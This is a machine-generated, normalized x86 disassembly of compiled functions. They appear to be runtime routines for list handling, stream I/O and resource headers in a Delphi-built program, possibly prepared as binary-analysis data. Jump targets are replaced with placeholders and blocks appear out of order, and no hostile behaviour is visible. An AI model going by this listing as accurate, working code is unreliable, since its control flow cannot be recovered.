sub_433448
push ebx
push esi
mov esi edx
mov ebx eax
cmp si [ ebx + 0xc ]
jne r-xdata
or [ ebx + 0x4 ] 0x2
mov [ ebx + 0xc ] si
test [ ebx + 0x4 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
sub_433468
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x10 ]
jne r-xdata
or [ esi + 0x4 ] 0x10
mov [ esi + 0x10 ] bl
test [ esi + 0x4 ] 0x10
jne r-xdata
pop esi
pop ebx
retn
sub_4334ac
push ebx
push esi
mov esi edx
mov ebx eax
cmp si [ ebx + 0xe ]
jne r-xdata
or [ ebx + 0x4 ] 0x4
mov [ ebx + 0xe ] si
test [ ebx + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_4334cc
push ebx
push esi
push edi
push ebp
call sub_405bb4
mov ebx edx
mov ebp eax
xor eax eax
mov [ ebp + 0x30 ] eax
mov [ ebp + 0x34 ] eax
xor eax eax
mov [ ebp + 0x38 ] eax
mov [ ebp + 0x3c ] eax
cmp [ ebp + 0x40 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_431e90
mov eax [ ebp + 0x20 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x20 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
mov [ ebp + 0x20 ] eax
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ ebp + 0x1c ]
mov edx [ r-xdata ]
call sub_407e40
inc esi
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_405b5c
mov edx edi
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4055f0
inc edi
dec esi
jne r-xdata
sub_433560
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x9c ]
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x98 ]
movzx eax [ ebx + 0x29 ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_432248
jmp r-xdata
sub_4335fc
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov eax [ ebx + 0x1c ]
mov ecx [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_407e40
xor eax eax
mov [ ebx + 0x20 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
mov esi [ ebx + 0x20 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4055f0
inc edi
dec esi
jne r-xdata
sub_433664
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_432248
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov eax [ ebx + 0x1c ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_407f50
dec [ ebx + 0x20 ]
mov eax [ ebx + 0x20 ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4055f0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x1c ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x1c ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4043c8
sub_4336e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_432248
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_432248
cmp edi [ ebx + 0x20 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_433740
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
retn
sub_433740
push ebx
mov ebx [ eax + 0x1c ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x1c ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_433764
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov [ esp + 0x8 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0xc ] 0x0
xor esi esi
mov eax [ edi + 0x20 ]
dec eax
mov [ esp + 0x10 ] eax
cmp esi [ esp + 0x10 ]
jg r-xdata
mov eax [ esp + 0x8 ]
mov [ eax ] esi
movzx eax [ esp + 0xc ]
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x10 ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x1c ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
mov [ esp + 0x14 ] eax
cmp [ esp + 0x14 ] 0x0
jge r-xdata
mov eax ebx
dec eax
mov [ esp + 0x10 ] eax
cmp [ esp + 0x14 ] 0x0
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0x10 ]
jle r-xdata
mov [ esp + 0xc ] 0x1
cmp [ edi + 0x29 ] 0x1
je r-xdata
mov esi ebx
sub_4337e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x20 ]
jb r-xdata
mov eax edi
mov edx [ ebx + 0x1c ]
mov edx [ edx + esi * 8 ]
call sub_4070a8
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_432248
sub_433820
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x20 ]
jb r-xdata
mov eax [ ebx + 0x1c ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_432248
sub_433844
push esi
mov edx [ eax + 0x24 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_433878
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x9c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_43289c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4338c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_432248
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_432248
cmp esi [ ebx + 0x20 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x98 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_433918
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jne r-xdata
mov eax [ ebx + 0x20 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_433844
mov eax [ ebx + 0x1c ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_4070a8
inc [ ebx + 0x20 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x1c ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x1c ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
add ecx ecx
mov eax edx
pop edx
call sub_4043c8
sub_433994
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
cmp esi [ ebx + 0x20 ]
jb r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_432248
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebx + 0x1c ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_4070a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_432248
sub_4339ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x20 ]
jb r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebx + 0x1c ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_432248
sub_433a28
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp esi ebx
je r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_433740
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_433a28
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
sub_433ac0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_432248
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
add edx edx
add edx edx
add edx edx
lea eax [ ebx + 0x1c ]
call sub_404238
mov [ ebx + 0x24 ] esi
cmp esi [ ebx + 0x24 ]
je r-xdata
sub_433b00
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x28 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x28 ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0xa0 ]
sub_433b20
push esi
mov esi eax
test dl dl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x94 ]
pop esi
retn
sub_433b40
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x1c ]
mov ecx [ eax + ecx * 8 ]
mov eax [ esi + 0x1c ]
mov edx [ eax + edi * 8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop edi
pop esi
pop ebx
retn
sub_433b70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x20 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
push esi
mov ecx [ ebx + 0x20 ]
dec ecx
xor edx edx
mov eax ebx
call sub_433a28
mov eax ebx
mov edx [ eax ]
call [ edx + 0x90 ]
sub_433bc4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_433bfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov [ esi + 0x40 ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_433c40
push ebx
mov ebx eax
cmp dl [ ebx + 0x2a ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2a ] dl
cmp [ ebx + 0x28 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_433b00
mov dl 0x1
mov eax ebx
call sub_433b00
sub_433c68
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_433c9c
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_433d00
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_433d54
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_433dba
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov eax [ eax ]
call sub_4054c8
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433dc1
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
sub_433dc8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x1a ] cx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x14 ]
mov edx [ edx ]
mov eax edx
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0xc ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
push ebp
call sub_433d54
pop ecx
mov eax [ ebx ]
call sub_40557c
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
movzx edx [ ebp - 0x1a ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_433d54
pop ecx
sub_433e4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
movzx ecx bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_433ebc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
sub_433ef4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
sub_433f2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_433c88
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_404204
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_434008
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43400f
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_404220
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_433ebc
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_433ef4
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_434020
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_434cf0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_434070
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_437390
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434077
mov eax [ ebp - 0x8 ]
call sub_4055f0
retn
sub_434088
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_434cf0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4340d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439150
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4340df
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_434108
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_434387
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x114 ]
mov eax [ ebp - 0x4 ]
call sub_410d30
mov eax [ ebp - 0x114 ]
push eax
call sub_4199d0
lea ecx [ ebp - 0x8 ]
pop edx
call sub_419308
mov eax [ ebp - 0x8 ]
call sub_408754
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax ebx
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov [ ebp - 0x110 ] 0xff
lea eax [ ebp - 0x10f ]
mov [ eax ] 0xa
mov eax [ ebp - 0x8 ]
call sub_408754
mov ebx eax
cmp ebx 0x3f
jle r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ ebp - 0x4 ]
call sub_410d30
mov eax [ ebp - 0x118 ]
push eax
call sub_419994
lea ecx [ ebp - 0x8 ]
pop edx
call sub_419308
mov eax [ ebp - 0x8 ]
call sub_408754
mov ebx eax
mov eax ebx
sar eax 0x1
jns r-xdata
lea eax [ ebx + 0x1 ]
push eax
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0x8 ]
mov [ eax + ebx ] 0x0
mov eax [ ebp - 0x8 ]
call sub_408754
mov ecx eax
lea edx [ ebp - 0x10d ]
mov eax [ ebp - 0x8 ]
call sub_4043c8
mov eax [ ebp - 0x8 ]
call sub_408754
add eax 0x9
lea edx [ ebp + eax - 0x116 ]
mov [ edx ] 0x1030
lea edx [ ebp + eax - 0x114 ]
xor ecx ecx
mov [ edx ] ecx
lea edx [ ebp - 0x110 ]
mov ecx eax
mov eax esi
call sub_433ef4
mov eax esi
call sub_433c68
mov edx [ ebp - 0x10 ]
mov [ edx ] eax
mov ebx 0x40
cmp eax 0x3f
jle r-xdata
adc eax 0x0
lea eax [ ebx + 0x2 ]
push eax
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0x8 ]
add eax ebx
mov [ eax ] 0x0
mov edx rw-data
mov ecx 0x20
mov eax esi
call sub_433ef4
mov eax esi
call sub_433c68
add eax 0x4
neg eax
mov edx [ ebp - 0x10 ]
mov [ edx ] eax
lea eax [ ebp - 0x110 ]
xor edx edx
mov [ eax ] edx
add ebx 0x1e
lea eax [ ebp - 0x10c ]
mov [ eax ] ebx
lea eax [ ebp - 0x108 ]
mov [ eax ] 0xaffff
mov eax [ ebp - 0x8 ]
call sub_408754
mov ebx eax
add ebx 0xc
mov eax [ ebp - 0x8 ]
call sub_408754
mov ecx eax
lea edx [ ebp - 0x104 ]
mov eax [ ebp - 0x8 ]
call sub_4043c8
lea eax [ ebp + ebx - 0x110 ]
xor edx edx
mov [ eax ] edx
lea eax [ ebp + ebx - 0x10c ]
mov [ eax ] 0x0
lea eax [ ebp + ebx - 0x10a ]
mov [ eax ] 0x409
lea eax [ ebp + ebx - 0x108 ]
xor edx edx
mov [ eax ] edx
lea eax [ ebp + ebx - 0x104 ]
xor edx edx
mov [ eax ] edx
lea ecx [ ebx + 0x10 ]
lea edx [ ebp - 0x110 ]
mov eax esi
call sub_433ef4
jmp r-xdata
mov ebx 0x7e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43438e
lea eax [ ebp - 0x118 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_408928
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_434394
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
mov eax ebx
call sub_433c68
sub eax esi
mov [ esp ] eax
mov eax esi
sub eax 0x4
cdq
push edx
push eax
mov eax ebx
call sub_433c88
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_433ef4
mov eax [ esp ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_433c88
mov eax ebx
call sub_433c68
mov edi esi
neg edi
sub eax edi
mov [ esp ] eax
mov eax esi
neg eax
mov eax edi
cdq
push edx
push eax
mov eax ebx
call sub_433c88
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_433ebc
mov eax [ esp ]
sub eax [ esp + 0x4 ]
add eax 0x4
mov [ esp ] eax
mov eax esi
neg eax
mov eax edi
sub eax 0x4
cdq
push edx
push eax
mov eax ebx
call sub_433c88
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_433ef4
neg esi
mov eax edi
add eax [ esp ]
add eax [ esp + 0x4 ]
sub eax 0x4
cdq
push edx
push eax
mov eax ebx
call sub_433c88
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_434458
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx eax
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_434108
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_434088
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_434394
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_43448c
push ebx
push esi
add esp 0xffffff00
mov ebx eax
mov eax esp
xor ecx ecx
mov edx 0x100
call sub_404c14
mov edx esp
mov ecx 0xff
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
cmp esi 0x20
jle r-xdata
mov eax esp
cmp [ eax ] 0xff
jne r-xdata
mov edx esp
mov eax rw-data
mov ecx 0x20
call sub_410f30
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
lea eax [ esp + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
xor ecx ecx
mov edx 0x20
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov edx esp
mov ecx 0xff
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
lea eax [ esp + 0x8 ]
cmp [ eax ] 0xaffff
jne r-xdata
